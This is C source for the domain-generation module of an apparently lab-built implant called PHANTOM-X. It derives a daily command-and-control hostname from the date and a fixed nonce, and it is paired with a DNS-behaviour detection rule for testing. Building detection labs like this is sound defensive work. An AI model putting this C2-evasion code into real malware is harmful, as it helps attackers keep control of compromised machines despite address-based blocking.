/* ================================================================== */
/* PHANTOM-X :: domain generation variant                               */
/* ================================================================== */
/*                                                                        */
/* WHAT IT DOES                                                          */
/*     Instead of connecting to a fixed IP address, the payload derives  */
/*     a hostname from the current date and connects to that.            */
/*                                                                        */
/* THE ALGORITHM                                                        */
/*     The seed is the day number since the Unix epoch. The hostname is */
/*     "<prefix>-<seed>-<nonce>" inside the lab's TLD.                  */
/*                                                                        */
/*     The nonce is a compile-time constant, so the lab's DNS helper    */
/*     can reproduce exactly the same names without being told what the */
/*     payload's nonce is.                                              */
/*                                                                        */
/* WHY IT IS HERE                                                        */
/*     A C2 detection that keys on a single fixed address or a single  */
/*     fixed hostname is one configuration change away from useless.     */
/*     The question the lab needs answered is: which of the detections  */
/*     survive the address moving?                                       */
/*                                                                        */
/*     The answer is that the ones keyed on DNS BEHAVIOUR survive,      */
/*     because a DGA produces a characteristic pattern -- many unique   */
/*     subdomains under one parent, with NXDOMAIN for the ones that     */
/*     have not been generated yet.                                     */
/*                                                                        */
/*     Rule px-012 in phase7_detection is the matching detection.       */
/*                                                                        */
/* WHY THE SEED IS DATED                                                */
/*     A dated seed means the lab can replay a run: the same day        */
/*     produces the same names, so a capture taken today can be         */
/*     resolved by the lab's DNS helper tomorrow. A time-based seed     */
/*     with second resolution would not.                                */
/*                                                                        */
/* SCOPE                                                                  */
/*     The lab's DNS helper resolves these names inside the isolated   */
/*     segment. Nothing leaves the lab.                                 */
/* ================================================================== */

#include "px_config.h"

#if PX_DGA

#include "px_strings.h"
#include "px_obfuscate.h"

/* The nonce. Compile-time constant so that the lab's DNS helper can
 * reproduce the same names. */
#define PX_DGA_NONCE 0x5A17C0DEu

/* Days since the Unix epoch, from the current UTC date.
 *
 * The days-to-civil conversion is done with the standard era arithmetic
 * so that there is no dependency on a time library: the payload cannot
 * call time() because it links no CRT. */
static unsigned long px_dga_seed(void)
{
    SYSTEMTIME st;
    unsigned long y, m, d, era, yoe, doy, doe, days;

    GetSystemTime(&st);
    y = (unsigned long)st.wYear;
    m = (unsigned long)st.wMonth;
    d = (unsigned long)st.wDay;

    /* days from the civil date, Howard Hinnant's algorithm */
    y -= (m <= 2);
    era = (y >= 0 ? y : y - 399) / 400;
    yoe = y - era * 400;
    doy = (153 * (m + (m > 2 ? -3 : 9)) + 2) / 5 + d - 1;
    doe = yoe * 365 + yoe / 4 - yoe / 100 + doy;
    days = era * 146097 + doe - 719468;

    return days;
}

/* Build the hostname for today into `out`.
 *
 * Returns the length, or 0 on failure. */
unsigned int px_dga_host(char *out, unsigned int cap)
{
    unsigned long seed = px_dga_seed();
    unsigned int n = 0;
    unsigned int i;
    const char *prefix = PX_DGA_DOMAIN;
    const char *tld = PX_DGA_TLD;

    /* <prefix>-<seed>-<nonce>.<tld> */
    for (i = 0; prefix[i] && n + 1 < cap; i++)
        out[n++] = prefix[i];
    if (n + 1 < cap)
        out[n++] = '-';

    /* the seed, decimal */
    {
        char digits[12];
        unsigned int d = 0;
        unsigned long v = seed;
        if (v == 0) {
            digits[d++] = '0';
        } else {
            while (v && d < sizeof(digits)) {
                digits[d++] = (char)('0' + (v % 10));
                v /= 10;
            }
        }
        while (d > 0 && n + 1 < cap)
            out[n++] = digits[--d];
    }

    if (n + 1 < cap)
        out[n++] = '-';

    /* the nonce, hex */
    {
        const char *hex = "0123456789abcdef";
        unsigned int k;
        for (k = 0; k < 8; k++) {
            if (n + 1 >= cap)
                break;
            out[n++] = hex[(PX_DGA_NONCE >> ((7 - k) * 4)) & 0xF];
        }
    }

    for (i = 0; tld[i] && n + 1 < cap; i++)
        out[n++] = tld[i];

    out[n] = '\0';
    return n;
}

/* The port is unchanged by the DGA variant: only the host moves. */
int px_dga_port(int fallback)
{
    return fallback;
}

#else  /* !PX_DGA */

unsigned int px_dga_host(char *out, unsigned int cap)
{
    (void)out;
    (void)cap;
    return 0;
}

int px_dga_port(int fallback)
{
    return fallback;
}

#endif /* PX_DGA */
